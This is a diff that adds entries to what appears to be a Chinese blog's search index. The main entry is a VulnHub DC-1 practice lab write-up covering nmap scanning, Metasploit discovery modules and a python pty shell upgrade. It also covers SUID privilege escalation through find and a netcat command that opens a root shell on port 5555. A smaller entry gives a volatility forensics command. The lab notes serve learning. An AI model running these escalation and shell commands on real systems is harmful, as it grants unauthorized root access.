@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>DC靶场</title>
+    <link href="/shen-tou-ce-shi/dc-ba-chang/"/>
+    <url>/shen-tou-ce-shi/dc-ba-chang/</url>
+    
+    <content type="html"><![CDATA[<h3 id="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"><a href="#最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点" class="headerlink" title="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"></a>最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点</h3><h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="1-发现存活主机"><a href="#1-发现存活主机" class="headerlink" title="1.发现存活主机"></a>1.发现存活主机</h4><h5 id="（1）nmap发现内网存活主机"><a href="#（1）nmap发现内网存活主机" class="headerlink" title="（1）nmap发现内网存活主机"></a>（1）nmap发现内网存活主机</h5><pre><code>nmap -sP 192.168.1.0/24nmap -A -p1-65535 -T4 ip  //扫描端口</code></pre><h5 id="（2）使用msf模块"><a href="#（2）使用msf模块" class="headerlink" title="（2）使用msf模块"></a>（2）使用msf模块</h5><pre><code>use auxiliary/scanner/discovery/arp_sweep use auxiliary/scanner/discovery/udp_sweepset rhosts 192.168.1.0/24</code></pre><h4 id="2-msf-查找可利用脚本"><a href="#2-msf-查找可利用脚本" class="headerlink" title="2.msf 查找可利用脚本"></a>2.msf 查找可利用脚本</h4><pre><code>searchsploit xxx</code></pre><h4 id="3-反弹shell升级半交互式"><a href="#3-反弹shell升级半交互式" class="headerlink" title="3.反弹shell升级半交互式"></a>3.反弹shell升级半交互式</h4><h5 id="半交互式shell"><a href="#半交互式shell" class="headerlink" title="半交互式shell"></a>半交互式shell</h5><p>对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：</p><pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span> </code></pre><h4 id="4-使用suid提权"><a href="#4-使用suid提权" class="headerlink" title="4.使用suid提权"></a>4.使用suid提权</h4><p>常见的可用来提权的linux可执行文件有：</p><p>Nmap , Vim , find , bash , more , less , nano , cp</p><p>查找具有root权限的命令，以下几条均可以查询</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><pre><code>ls -al /usr/bin/find-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>定位到tmp目录下，touch（创建）一个aaa文件</p><p><img src="https://i.loli.net/2020/09/04/nLjxSZXcP6m75Yp.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p><img src="https://i.loli.net/2020/09/04/uL9epAo2IHFSgNf.jpg" srcset="/img/loading.gif" alt=""></p><p>大部分Linux 系统都安装了nc。使用</p><p><code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code></p><p> 即可成功反弹root shell</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>volatility使用</title>
+    <link href="/qu-zheng/volatility-shi-yong/"/>
+    <url>/qu-zheng/volatility-shi-yong/</url>
+    
+    <content type="html"><![CDATA[<h2 id="volatility使用"><a href="#volatility使用" class="headerlink" title="volatility使用"></a>volatility使用</h2><p>volatility -f newgame.raw imageinfo</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>取证</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>第四届蓝帽杯线上赛部分wp</title>
     <link href="/ctf/di-si-jie-lan-mao-bei-xian-shang-sai-bu-fen-wp/"/>
     <url>/ctf/di-si-jie-lan-mao-bei-xian-shang-sai-bu-fen-wp/</url>
